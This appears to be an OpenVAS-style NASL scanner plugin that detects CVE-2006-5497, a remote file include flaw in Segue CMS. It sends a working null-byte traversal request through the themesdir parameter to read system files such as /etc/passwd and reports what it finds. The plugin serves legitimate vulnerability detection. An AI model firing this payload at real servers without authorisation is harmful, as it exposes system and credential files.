if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.80085" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2006-5497" );
	script_bugtraq_id( 20640 );
	script_xref( name: "OSVDB", value: "29904" );
	script_name( "Segue CMS themesdir Parameter Remote File Include Vulnerability" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "Copyright (C) 2008 Justin Seitz" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "solution", value: "Update to version 1.5.9 or later." );
	script_tag( name: "summary", value: "The remote web server contains a PHP script that is affected by a
remote file include issue.

Description:

The remote web server is running Segue CMS, an open source content
management system tailored for educational institutions.

The version of Segue CMS installed on the remote host fails to
sanitize input to the 'themesdir' parameter before using it in the
'themes/program/themesettings.inc.php' script to include PHP code.
Provided PHP's 'register_globals' setting is enabled, an
unauthenticated attacker can exploit this issue to view arbitrary
files and execute arbitrary code, possibly taken from third-party
hosts, on the remote host." );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/2600" );
	script_xref( name: "URL", value: "http://www.nessus.org/u?5c00bd47" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
files = traversal_files();
for dir in nasl_make_list_unique( "/segue", "/seguecms", "/cms", "/blog", "/forum", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	for pattern in keys( files ) {
		file = files[pattern];
		req = http_get( item: NASLString( dir, "/themes/program/themesettings.inc.php?themesdir=/", file, "%00" ), port: port );
		res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
		if(!res){
			continue;
		}
		if(egrep( pattern: pattern, string: res ) || ContainsString( res, NASLString( "main(", file, "\\\\0themes/program/themesettings.inc.php): failed to open stream" ) ) || ContainsString( res, NASLString( "main(", file, "): failed to open stream: No such file" ) ) || ContainsString( res, "open_basedir restriction in effect. File(" )){
			passwd = "";
			if(egrep( pattern: pattern, string: res )){
				passwd = res;
				if(ContainsString( passwd, "<br" )){
					passwd = passwd - strstr( passwd, "<br" );
				}
				if(ContainsString( passwd, "Choose the color scheme" )){
					passwd = passwd - strstr( passwd, "Choose the color scheme" );
				}
			}
			if( passwd ){
				info = NASLString( "The version of Segue CMS installed in directory '", dir, "'\\n", "is vulnerable to this issue. Here is the contents of /" + file + "\\n", "from the remote host :\\n\\n", passwd );
			}
			else {
				info = "";
			}
			security_message( data: info, port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

